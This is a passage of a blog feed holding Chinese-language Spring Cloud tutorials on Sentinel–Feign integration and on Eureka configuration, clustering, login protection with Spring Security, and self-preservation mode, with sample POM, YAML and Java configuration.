<code>feign-hystrix</code>。所以是说默认使用 <code>HystrixTargeter</code> 这个 <code>Targeter</code> ，进入 <code>HystrixTargeter</code> 的 <code>target</code> 方法内部一看，发现有段逻辑这么写的：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token class-name">T</span> <span class="token function">target</span><span class="token punctuation">(</span><span class="token class-name">FeignClientFactoryBean</span> factory<span class="token punctuation">,</span> <span class="token class-name">Feign<span class="token punctuation">.</span>Builder</span> feign<span class="token punctuation">,</span> <span class="token class-name">FeignContext</span> context<span class="token punctuation">,</span>                    <span class="token class-name">Target<span class="token punctuation">.</span>HardCodedTarget</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>feign <span class="token keyword">instanceof</span> <span class="token class-name"><span class="token namespace">feign<span class="token punctuation">.</span>hystrix<span class="token punctuation">.</span></span>HystrixFeign<span class="token punctuation">.</span>Builder</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 如果 Builder 不是 feign.hystrix.HystrixFeign.Builder，使用这个 Builder 进行处理</span>    <span class="token comment">// 我们默认构造了 SentinelFeign.Builder 这个 Builder，默认使用 feign-hystrix 依赖也没有什么问题</span>    <span class="token keyword">return</span> feign<span class="token punctuation">.</span><span class="token function">target</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token class-name"><span class="token namespace">feign<span class="token punctuation">.</span>hystrix<span class="token punctuation">.</span></span>HystrixFeign<span class="token punctuation">.</span>Builder</span> builder <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">feign<span class="token punctuation">.</span>hystrix<span class="token punctuation">.</span></span>HystrixFeign<span class="token punctuation">.</span>Builder</span><span class="token punctuation">)</span> feign<span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>SentinelInvocationHandler</code> 内部我们对资源名的处理策略是: <code>http方法:protocol://服务名/请求路径跟参数</code></p><p>比如这个 <code>TestService</code>:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@FeignClient</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"test-service"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">TestService</span> <span class="token punctuation">&#123;</span>  <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/echo/&#123;str&#125;"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">)</span>  <span class="token class-name">String</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span><span class="token punctuation">(</span><span class="token string">"str"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/divide"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">)</span>  <span class="token class-name">String</span> <span class="token function">divide</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token class-name">Integer</span> a<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">)</span> <span class="token class-name">Integer</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>echo</code> 方法对应的资源名：<code>GET:http://test-service/echo/{str}</code></li><li><code>divide</code> 方法对应的资源名：<code>GET:http://test-service/divide</code></li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.Feign 的内部很多类都是 package 级别的，外部 package 无法引用某些类，这个时候只能想办法绕过去，比如使用反射</p><p>2.目前这种实现有风险，万一哪天 starter 内部使用的 Feign 相关类变成了 package 级别，那么会改造代码。所以把 Sentinel 的实现放到 Feign 里并给 Feign 官方提 pr 可能更加合适</p><p>3.Feign的处理流程还是比较清晰的，只要能够理解其设计原理，我们就能容易地整合进去</p><p>欢迎大家对整合方案进行讨论，并能给出不合理的地方，当然能提pr解决不合理的地方就更好了。</p><p>Sentinel Starter 整合 Feign 的代码目前已经在 github 仓库上，但是没未发版。预计月底发版，如果现在就想使用，可以在 pom 中引入 Spring SNAPSHOT 的 repository 或自行下载源码进行编译。</p><p>最后再附上一个使用 Nacos 做服务发现和 Sentinel 做限流的 Feign 例子。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud Eureka 常用配置详解，建议收藏！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Eureka%20%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%EF%BC%8C%E5%BB%BA%E8%AE%AE%E6%94%B6%E8%97%8F%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Eureka%20%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3%EF%BC%8C%E5%BB%BA%E8%AE%AE%E6%94%B6%E8%97%8F%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>前几天，栈长分享了 《<a href="https://mp.weixin.qq.com/s/uyoN8iB1rLOS9mLuvVebbg">Spring Cloud Eureka 注册中心集群搭建，Greenwich 最新版！</a>》，今天来分享下 Spring Cloud Eureka 常用的一些参数配置及说明。</p><p>Spring Cloud Eureka 主要分为下面三个模块的参数：</p><ul><li><strong>Eureka Server</strong></li><li><strong>Eureka Client</strong></li><li><strong>Eureka Instance</strong></li></ul><h2 id="Eureka-Server"><a href="#Eureka-Server" class="headerlink" title="Eureka Server"></a>Eureka Server</h2><p>Eureka Server 的配置参数格式：eureka.server.xxx。</p><h4 id="enable-self-preservation"><a href="#enable-self-preservation" class="headerlink" title="enable-self-preservation"></a>enable-self-preservation</h4><p>表示注册中心是否开启服务的自我保护能力。</p><h4 id="renewal-percent-threshold"><a href="#renewal-percent-threshold" class="headerlink" title="renewal-percent-threshold"></a>renewal-percent-threshold</h4><p>表示 Eureka Server 开启自我保护的系数，默认：0.85。</p><h4 id="eviction-interval-timer-in-ms"><a href="#eviction-interval-timer-in-ms" class="headerlink" title="eviction-interval-timer-in-ms"></a>eviction-interval-timer-in-ms</h4><p>表示 Eureka Server 清理无效节点的频率，默认 60000 毫秒（60 秒）。</p><p>更多 Eureka Server 参数配置可以看一下这个类：</p><blockquote><p>org.springframework.cloud.netflix.eureka.server.EurekaServerConfigBean</p></blockquote><h2 id="Eureka-Instance"><a href="#Eureka-Instance" class="headerlink" title="Eureka Instance"></a>Eureka Instance</h2><p>Eureka Instance 的配置参数格式：eureka.instance.xxx。</p><h4 id="instance-id"><a href="#instance-id" class="headerlink" title="instance-id"></a>instance-id</h4><p>表示实例在注册中心注册的唯一ID。</p><h4 id="prefer-ip-address"><a href="#prefer-ip-address" class="headerlink" title="prefer-ip-address"></a>prefer-ip-address</h4><ul><li>true：实例以 IP 的形式注册</li><li>false：实例以机器 HOSTNAME 形式注册</li></ul><h4 id="lease-expiration-duration-in-seconds"><a href="#lease-expiration-duration-in-seconds" class="headerlink" title="lease-expiration-duration-in-seconds"></a>lease-expiration-duration-in-seconds</h4><p>表示 Eureka Server 在接收到上一个心跳之后等待下一个心跳的秒数（默认 90 秒），若不能在指定时间内收到心跳，则移除此实例，并禁止此实例的流量。</p><ul><li>此值设置太长，即使实例不存在，流量也能路由到该实例</li><li>此值设置太小，由于网络故障，实例会被取消流量</li></ul><p>需要设置为至少高于 lease-renewal-interval-in-seconds 的值，不然会被误移除了。</p><h4 id="lease-renewal-interval-in-seconds"><a href="#lease-renewal-interval-in-seconds" class="headerlink" title="lease-renewal-interval-in-seconds"></a>lease-renewal-interval-in-seconds</h4><p>表示 Eureka Client 向 Eureka Server 发送心跳的频率（默认 30 秒），如果在 lease-expiration-duration-in-seconds 指定的时间内未收到心跳，则移除该实例。</p><p>更多 Eureka Instance 参数配置可以看一下这个类：</p><blockquote><p>org.springframework.cloud.netflix.eureka.EurekaInstanceConfigBean</p></blockquote><h2 id="Eureka-Client"><a href="#Eureka-Client" class="headerlink" title="Eureka Client"></a>Eureka Client</h2><p>Eureka Client 的配置参数格式：eureka.client.xxx。</p><h4 id="register-with-eureka"><a href="#register-with-eureka" class="headerlink" title="register-with-eureka"></a>register-with-eureka</h4><p>表示此实例是否注册到 Eureka Server 以供其他实例发现。在某些情况下，如果你不想自己的实例被发现，而只想发现其他实例，配置为 false 即可。</p><h4 id="fetch-registry"><a href="#fetch-registry" class="headerlink" title="fetch-registry"></a>fetch-registry</h4><p>表示客户端是否从 Eureka Server 获取实例注册信息。</p><h4 id="serviceUrl-defaultZone"><a href="#serviceUrl-defaultZone" class="headerlink" title="serviceUrl.defaultZone"></a>serviceUrl.defaultZone</h4><p>表示客户端需要注册的 Eureka Server 的地址。</p><p>更多 Eureka Client 参数配置可以看一下这个类：</p><blockquote><p>org.springframework.cloud.netflix.eureka.EurekaClientConfigBean</p></blockquote><h2 id="用到的其他参数"><a href="#用到的其他参数" class="headerlink" title="用到的其他参数"></a>用到的其他参数</h2><h4 id="spring-application-name"><a href="#spring-application-name" class="headerlink" title="spring.application.name"></a>spring.application.name</h4><p>表示应用名称，在注册中心中显示的服务注册名称。</p><h4 id="spring-cloud-client-ip-address"><a href="#spring-cloud-client-ip-address" class="headerlink" title="spring.cloud.client.ip-address"></a>spring.cloud.client.ip-address</h4><p>获取客户端的 IP 地址。</p><p>上面讲的 Eureka 某些参数可以在 Eureka 控制台上面找到。</p><p><img src="http://img.javastack.cn/20190423153640.png"></p><p>Eureka 控制台上面的其他参数都可以定制。</p><p>好了，今天的分享就到这里了，建议转发收藏，不再迷路。</p><ul><li>Spring Cloud 配置中心高可用搭建</li><li>Spring Cloud 多版本如何选择</li><li>Spring Cloud 是什么，和 Dubbo 对比</li><li>Spring Cloud 注册中心高可用搭建</li><li>Spring Cloud Eureka 自我保护机制</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud Eureka 注册中心集群搭建，Greenwich 最新版！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Eureka%20%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA%EF%BC%8CGreenwich%20%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Eureka%20%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA%EF%BC%8CGreenwich%20%E6%9C%80%E6%96%B0%E7%89%88%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>Spring Cloud 的注册中心可以由 Eureka、Consul、Zookeeper、ETCD 等来实现，这里推荐使用 Spring Cloud Eureka 来实现注册中心，它基于 Netflix 的 Eureka 做了二次封装，完成分布式服务中服务治理的功能，微服务系统中的服务注册与发现都通过这个注册中心来进行管理。</p><p>今天栈长就来分享一个 Eureka 注册中心玩法，从 0 到分布式集群一步到位，单机版的咱就不玩了，没意义。</p><p>本文基于最新的 <a href="https://mp.weixin.qq.com/s/V6W634Rqjm9SoKb04bGygA">Spring Cloud Greenwich.SR1</a> 以及 Spring Boot 2.1.3 版本进行分享。</p><h2 id="快速构建一个-Eureka-Server-项目"><a href="#快速构建一个-Eureka-Server-项目" class="headerlink" title="快速构建一个 Eureka Server 项目"></a>快速构建一个 Eureka Server 项目</h2><p>打开 Spring 的快速构建网址，如下图所示，选择对应的参数，最后选择 Eureka Server 依赖，生成项目示例代码即可。</p><blockquote><p><a href="https://start.spring.io/">https://start.spring.io/</a></p></blockquote><p><img src="http://img.javastack.cn/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190327180739.png"></p><p><img src="http://img.javastack.cn/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190327180726.png"></p><p>栈长这里是生成了一个 Maven 示例项目。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt;&lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt;&lt;parent&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-starter-parent&lt;&#x2F;artifactId&gt;&lt;version&gt;2.1.3.RELEASE&lt;&#x2F;version&gt;&lt;relativePath&#x2F;&gt; <!-- lookup parent from repository -->&lt;&#x2F;parent&gt;&lt;groupId&gt;cn.javastack&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud--eureka-server&lt;&#x2F;artifactId&gt;&lt;version&gt;0.0.1-SNAPSHOT&lt;&#x2F;version&gt;&lt;name&gt;spring-cloud--eureka-server&lt;&#x2F;name&gt;&lt;description&gt;Demo project for Spring Cloud Eureka Server&lt;&#x2F;description&gt;&lt;properties&gt;&lt;java.version&gt;1.8&lt;&#x2F;java.version&gt;&lt;spring-cloud.version&gt;Greenwich.SR1&lt;&#x2F;spring-cloud.version&gt;&lt;&#x2F;properties&gt;&lt;dependencies&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-starter-test&lt;&#x2F;artifactId&gt;&lt;scope&gt;test&lt;&#x2F;scope&gt;&lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;&lt;dependencyManagement&gt;&lt;dependencies&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-cloud-dependencies&lt;&#x2F;artifactId&gt;&lt;version&gt;$&#123;spring-cloud.version&#125;&lt;&#x2F;version&gt;&lt;type&gt;pom&lt;&#x2F;type&gt;&lt;scope&gt;import&lt;&#x2F;scope&gt;&lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;&lt;&#x2F;dependencyManagement&gt;&lt;build&gt;&lt;plugins&gt;&lt;plugin&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-maven-plugin&lt;&#x2F;artifactId&gt;&lt;&#x2F;plugin&gt;&lt;&#x2F;plugins&gt;&lt;&#x2F;build&gt;&lt;&#x2F;project&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要是加入了 Eureka Server 和 Spring Test 依赖包，还有 Spring Boot 和 Spring Cloud 的基础依赖。</p><h2 id="开启-Eureka-Server-功能"><a href="#开启-Eureka-Server-功能" class="headerlink" title="开启 Eureka Server 功能"></a>开启 Eureka Server 功能</h2><pre class="line-numbers language-none"><code class="language-none">@EnableEurekaServer@SpringBootApplicationpublic class EurekaServerApplication &#123;    public static void main(String[] args) &#123;        SpringApplication.run(EurekaServerApplication.class, args);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在启动类上加入 @EnableEurekaServer 注解，<code>@EnableEurekaServer</code>注解即开启注册中心服务器的功能。</p><h2 id="添加-Eureka-Server-配置"><a href="#添加-Eureka-Server-配置" class="headerlink" title="添加 Eureka Server 配置"></a>添加 Eureka Server 配置</h2><p>在 application.yml 中加入如下配置：</p><pre class="line-numbers language-none"><code class="language-none">spring:  application:    name: register-centereureka:  instance:    prefer-ip-address: false    instance-id: $&#123;spring.cloud.client.ip-address&#125;:$&#123;server.port&#125;    lease-expiration-duration-in-seconds: 30    lease-renewal-interval-in-seconds: 5  server:    enable-self-preservation: true    eviction-interval-timer-in-ms: 5000  client:    register-with-eureka: true    fetch-registry: true    serviceUrl:      defaultZone: http:&#x2F;&#x2F;eureka1:8761&#x2F;eureka&#x2F;, http:&#x2F;&#x2F;eureka2:8762&#x2F;eureka&#x2F;logging.level.com.netflix:  eureka: OFF  discovery: OFF---spring:  profiles: rc1server:  port: 8761eureka.instance.hostname: eureka1---spring:  profiles: rc2server:  port: 8762eureka.instance.hostname: eureka2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里做了两台注册中心的高可用配置rc1,rc2，也可以做多台，既然是高可用，每个注册中心都向别的注册中心注册自己。</p><p><strong>注意不要用Localhost</strong></p><p><img src="http://img.javastack.cn/20190328114313.png"></p><p>如上图所示，如果大家在实战中遇到集群不可用，出现在 unavailable-replicas 里面时，说明是你配置的问题。</p><p>如果 defaultZone 用了 localhost，prefer-ip-address 设置的是 false，则集群不行，不能用 localhost，要配置 hosts，并代替 localhost。</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1 localhost eureka1 eureka2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="启动-Eureka-注册中心"><a href="#启动-Eureka-注册中心" class="headerlink" title="启动 Eureka 注册中心"></a>启动 Eureka 注册中心</h2><p>这样两个注册心的 Eureka Server 就搭好了，启动的时候使用不同的 Profile 来指定不同的端口。</p><pre class="line-numbers language-none"><code class="language-none">spring-boot:run -Dspring-boot.run.profiles&#x3D;rc1spring-boot:run -Dspring-boot.run.profiles&#x3D;rc2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>按上方面命令启动两个 Eureka Server，然后再来验证一下注册情况，分别打开两个 Eureka Server 控制台页面。</p><blockquote><p><a href="http://localhost:8761/">http://localhost:8761/</a><br><a href="http://localhost:8762/">http://localhost:8762/</a></p></blockquote><p><img src="http://img.javastack.cn/20190328103743.png"></p><p>我们可以看到两个注册的注册中心实例了。</p><ul><li>Spring Cloud 最新 Finchley 版本踩坑</li><li>Spring Cloud 多版本如何选择</li><li>Spring Cloud 是什么，和 Dubbo 对比</li><li>Spring Cloud 配置中心高可用搭建</li><li>Spring Cloud Eureka 自我保护机制</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud Eureka 注册安全一定要做到位！</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Eureka%20%E6%B3%A8%E5%86%8C%E5%AE%89%E5%85%A8%E4%B8%80%E5%AE%9A%E8%A6%81%E5%81%9A%E5%88%B0%E4%BD%8D%EF%BC%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Eureka%20%E6%B3%A8%E5%86%8C%E5%AE%89%E5%85%A8%E4%B8%80%E5%AE%9A%E8%A6%81%E5%81%9A%E5%88%B0%E4%BD%8D%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>但控制台首页默认是没有登录认证保护的，打开就能访问，而且你的微服务也能随意注册进去，这样是不安全的，本章栈长将加入登录认证功能，把你的 Eureka 注册中心保护起来。</p><p>本文基于最新的 <a href="https://mp.weixin.qq.com/s/V6W634Rqjm9SoKb04bGygA">Spring Cloud Greenwich.SR1</a> 以及 Spring Boot 2.1.3 版本进行分享。</p><p><strong>1、加入 Spring Security 依赖</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-starter-security&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2、添加安全配置</strong></p><p>在 application.yml 配置文件中添加以下配置：</p><pre class="line-numbers language-none"><code class="language-none">spring:   security:    user:      name: javastack      password: javastack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置用来登录认证的用户名和密码。</p><p><strong>3、修改defaultZone</strong></p><p>需要在 defaultZone 中添加用户名密码认证。</p><p>格式如下：</p><pre class="line-numbers language-none"><code class="language-none">defaultZone: http:&#x2F;&#x2F;username:password@eureka:8761&#x2F;eureka&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考配置如下：</p><pre class="line-numbers language-none"><code class="language-none">defaultZone: http:&#x2F;&#x2F;javastack:javastack@eureka1:8761&#x2F;eureka&#x2F;, http:&#x2F;&#x2F;javastack:javastack@eureka2:8762&#x2F;eureka&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>4、禁用CSRF</strong></p><p><img src="http://img.javastack.cn/20190328114313.png"></p><p>如上图所示，注册实例出现在 unavailable-replicas 里面。</p><p>这是因为加入了安全认证模块后，默认会开启 CSRF 跨站脚本攻击，需要禁用它，添加以下配置即可。</p><blockquote><p>参考：<a href="https://cloud.spring.io/spring-cloud-netflix/multi/multi_spring-cloud-eureka-server.html#_securing_the_eureka_server">https://cloud.spring.io/spring-cloud-netflix/multi/multi_spring-cloud-eureka-server.html#_securing_the_eureka_server</a></p></blockquote><pre class="line-numbers language-none"><code class="language-none">@EnableWebSecurityclass WebSecurityConfig extends WebSecurityConfigurerAdapter &#123;    @Override    protected void configure(HttpSecurity http) throws Exception &#123;        http.csrf().ignoringAntMatchers(&quot;&#x2F;eureka&#x2F;**&quot;);        super.configure(http);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样配置后，打开 Eureka 控制台页面会先要跳到登录页面做登录认证才能访问，如下图所示。</p><p><img src="http://img.javastack.cn/20190328145822.png"></p><ul><li>Spring Cloud 最新 Finchley 版本踩坑</li><li>Spring Cloud 多版本如何选择</li><li>Spring Cloud 是什么，和 Dubbo 对比</li><li>Spring Cloud 注册中心高可用搭建</li><li>Spring Cloud Eureka 自我保护机制</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud Eureka 自我保护机制</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Eureka%20%E8%87%AA%E6%88%91%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Eureka%20%E8%87%AA%E6%88%91%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="自我保护背景"><a href="#自我保护背景" class="headerlink" title="自我保护背景"></a>自我保护背景</h2><p>首先对Eureka注册中心需要了解的是Eureka各个节点都是平等的，没有ZK中角色的概念， 即使N-1个节点挂掉也不会影响其他节点的正常运行。</p><p>默认情况下，如果Eureka Server在一定时间内（默认90秒）没有接收到某个微服务实例的心跳，Eureka Server将会移除该实例。但是当网络分区故障发生时，微服务与Eureka Server之间无法正常通信，而微服务本身是正常运行的，此时不应该移除这个微服务，所以引入了自我保护机制。</p><h2 id="自我保护机制"><a href="#自我保护机制" class="headerlink" title="自我保护机制"></a>自我保护机制</h2><p>官方对于自我保护机制的定义：</p><blockquote><p><a href="https://github.com/Netflix/eureka/wiki/Understanding-Eureka-Peer-to-Peer-Communication">https://github.com/Netflix/eureka/wiki/Understanding-Eureka-Peer-to-Peer-Communication</a></p></blockquote><p>自我保护模式正是一种针对网络异常波动的安全保护措施，使用自我保护模式能使Eureka集群更加的健壮、稳定的运行。</p><p>自我保护机制的工作机制是如果在15分钟内超过85%的客户端节点都没有正常的心跳，那么Eureka就认为客户端与注册中心出现了网络故障，Eureka Server自动进入自我保护机制，此时会出现以下几种情况：</p><p>1、Eureka Server不再从注册列表中移除因为长时间没收到心跳而应该过期的服务。<br>2、Eureka Server仍然能够接受新服务的注册和查询请求，但是不会被同步到其它节点上，保证当前节点依然可用。<br>3、当网络稳定时，当前Eureka Server新的注册信息会被同步到其它节点中。</p><p>因此Eureka Server可以很好的应对因网络故障导致部分节点失联的情况，而不会像ZK那样如果有一半不可用的情况会导致整个集群不可用而变成瘫痪。</p><h2 id="自我保护开关"><a href="#自我保护开关" class="headerlink" title="自我保护开关"></a>自我保护开关</h2><p>Eureka自我保护机制，通过配置<code>eureka.server.enable-self-preservation</code>来true打开&#x2F;false禁用自我保护机制，默认打开状态，建议生产环境打开此配置。</p><h2 id="开发环境配置"><a href="#开发环境配置" class="headerlink" title="开发环境配置"></a>开发环境配置</h2><p>开发环境中如果要实现服务失效能自动移除，只需要修改以下配置。</p><h4 id="1、-注册中心关闭自我保护机制，修改检查失效服务的时间。"><a href="#1、-注册中心关闭自我保护机制，修改检查失效服务的时间。" class="headerlink" title="1、 注册中心关闭自我保护机制，修改检查失效服务的时间。"></a>1、 注册中心关闭自我保护机制，修改检查失效服务的时间。</h4><pre class="line-numbers language-none"><code class="language-none">eureka:  server:     enable-self-preservation: false    eviction-interval-timer-in-ms: 3000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2、-微服务修改减短服务心跳的时间。"><a href="#2、-微服务修改减短服务心跳的时间。" class="headerlink" title="2、 微服务修改减短服务心跳的时间。"></a>2、 微服务修改减短服务心跳的时间。</h4><pre class="line-numbers language-none"><code class="language-none"># 默认90秒lease-expiration-duration-in-seconds: 10# 默认30秒lease-renewal-interval-in-seconds: 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>以上配置建议在生产环境使用默认的时间配置。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud Eureka 自我保护机制实战分析</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Eureka%20%E8%87%AA%E6%88%91%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%AE%9E%E6%88%98%E5%88%86%E6%9E%90/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Eureka%20%E8%87%AA%E6%88%91%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%AE%9E%E6%88%98%E5%88%86%E6%9E%90/</url>
      
